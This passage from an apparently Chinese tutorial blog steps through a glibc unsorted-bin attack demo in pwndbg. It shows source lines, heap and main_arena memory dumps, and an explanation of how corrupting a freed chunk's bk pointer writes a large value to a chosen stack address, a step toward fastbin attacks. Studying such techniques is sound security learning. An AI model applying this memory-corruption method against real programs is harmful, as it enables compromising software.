class="hljs-number">162</span>&gt;    call   <span class="hljs-built_in">fprintf</span>@plt &lt;<span class="hljs-built_in">fprintf</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40074d</span> &lt;main+<span class="hljs-number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x20090c</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400754</span> &lt;main+<span class="hljs-number">174</span>&gt;    mov    rcx, rax<br>──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────<br>In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c<br>    <span class="hljs-number">7</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br>    <span class="hljs-number">8</span> <br>    <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>   <span class="hljs-number">10</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br>   <span class="hljs-number">11</span> <br> ► <span class="hljs-number">12</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>   <span class="hljs-number">13</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>   <span class="hljs-number">14</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>   <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>   <span class="hljs-number">16</span> <br>   <span class="hljs-number">17</span>     <span class="hljs-built_in">free</span>(p);<br>──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdd78</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdd80</span> —▸ <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdd88</span> ◂— <span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│ rbp  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0x7fffffffdd98</span> —▸ <span class="hljs-number">0x7ffff7a2d840</span> (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdda0</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdda8</span> —▸ <span class="hljs-number">0x7fffffffde78</span> —▸ <span class="hljs-number">0x7fffffffe20d</span> ◂— <span class="hljs-string">'/home/ubuntu/Desktop/unsortedbin_demo/demo'</span><br>────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>           <span class="hljs-number">400722</span> main+<span class="hljs-number">124</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>看一下这时的本地变量情况：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x7fffffffde70</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;stack_var<br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007fffffffde70</span><br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;p<br><span class="hljs-number">0x7fffffffdd80</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">0x7fffffffdd90</span>:	<span class="hljs-number">0x0000000000400870</span>	<span class="hljs-number">0x00007ffff7a2d840</span><br><span class="hljs-number">0x7fffffffdda0</span>:	<span class="hljs-number">0x0000000000000001</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>从上面的代码框可以看到，此时：<br>● stack_var的值为0，此变量的地址为0x7fffffffdd78<br>● p的值为0x7fffffffde70，此变量的地址为0x7fffffffdd80</p>
<h3 id="执行unsigned-long-p-x3D-malloc-0x410"><a href="#执行unsigned-long-p-x3D-malloc-0x410" class="headerlink" title="执行unsigned long *p=malloc(0x410);"></a>执行unsigned long *p=malloc(0x410);</h3><p>对代码的第13行下断点，让程序执行：unsigned long *p=malloc(0x410);  继续查看内存：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602420</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">160</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020be1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x6024f0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602420</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<h3 id="执行malloc-500"><a href="#执行malloc-500" class="headerlink" title="执行malloc(500);"></a>执行malloc(500);</h3><p>现在指针p指向malloc_data，紧接着对代码的第17行下断点让程序执行：malloc(500);，继续查看内存：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602620</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena <br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000201</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602620</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00000000000209e1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x602950</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>此处又malloc一个空间是为了避免malloc_chunk1与top_chunk相邻而导致的在free chunk1时不回收到unsortedbin。</p>
<blockquote>
<p><strong>释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。</strong></p>
</blockquote>
<h3 id="执行free-p"><a href="#执行free-p" class="headerlink" title="执行free(p)"></a>执行free(p)</h3><p>对代码的第18行下断点，程序将会执行：free(p);  继续运行程序，查看内存：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br>    		<span class="hljs-meta">#fd					#bk</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......(省略内容均为空)<br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> <br> 													#指向top_chunk<br>													<span class="hljs-meta">#unsortedbin指向的地方</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602000</span> <br>    												<span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x0000000000602000</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b88</span>	<span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b98</span>	<span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1ba8</span>	<span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bb8</span>	<span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bc8</span>	<span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bd8</span>	<span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1be8</span>	<span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>在之前的文章中我们说过，当unsortedbin只有一个free_chunk时，它的fd和bk指针都指向unsortedbin本身。</p>
<p class='item-img' data-src='https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png'><img src="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png" alt="Snipaste_2023-09-13_20-40-59.png"></p>
<h3 id="执行p-1-x3D-unsigned-long-amp-stack-var-2"><a href="#执行p-1-x3D-unsigned-long-amp-stack-var-2" class="headerlink" title="执行p[1]=(unsigned long)(&amp;stack_var-2);"></a>执行p[1]=(unsigned long)(&amp;stack_var-2);</h3><p>对代码第21行下断点，继续：p[1]=(unsigned long)(&amp;stack_var-2);</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007fffffffdd68</span><br>    		<span class="hljs-meta">#fd					#bk被更改</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<p>现在我们已经更改了unsortedbin中malloc_chunk1指针为0x00007fffffffdd68。刚好是刚才申请的 stack_var - 0x10 的位置</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>pwndbg&gt; unsortedbin <br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x00007fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:	<span class="hljs-number">0x00000000004007a8</span>	<span class="hljs-number">0x0000000000400870</span><br>    			<span class="hljs-meta">#unsortedbin中bk指针所指向的地方</span><br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602010</span><br>    			#想要被修改为超大值的地方<br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span>	<span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:	<span class="hljs-number">0x00007fffffffde78</span>	<span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:	<span class="hljs-number">0x00000000004006a6</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:	<span class="hljs-number">0x9c796560ff5ea285</span>	<span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>

<h3 id="执行malloc-0x410"><a href="#执行malloc-0x410" class="headerlink" title="执行malloc(0x410)"></a>执行malloc(0x410)</h3><p>执行malloc(0x410)时，会判断所申请的chunk处于smallbin所在的范围，但是此时smallbin中并没有空闲的chunk，所以会去unsortedbin找，发现unsortedbin不空，于是把unsortedbin中的<strong>最后一个</strong>chunk拿出来。<br>由于上面我们修改了bk指针所指向的地址，所以现在bk指针所指向的地址被加入到了unsortedbin中，也就是说，现在这个地址是unsortedbin中最后一个chunk，malloc之后将在这个地址中创建堆块。</p>
<blockquote>
<p>unsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即<strong>插入的时候插入到unsortedbin的头部，取出的时候从链尾获取。</strong></p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>之后结果如下：<br>pwndbg&gt; unsortedbin<br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x7fffffffdd68</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   rbp<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602000</span> <span class="hljs-meta">#malloc(0x410)</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007fffffffdd68</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b88</span>	<span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b98</span>	<span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1ba8</span>	<span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bb8</span>	<span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bc8</span>	<span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bd8</span>	<span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1be8</span>	<span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x7fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:	<span class="hljs-number">0x000000000040080a</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x0000000000602010</span><br>    			#现在此地址被更改为较大的数（其值为main_arena+<span class="hljs-number">88</span>的地址）<br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span>	<span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:	<span class="hljs-number">0x00007fffffffde78</span>	<span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:	<span class="hljs-number">0x00000000004006a6</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:	<span 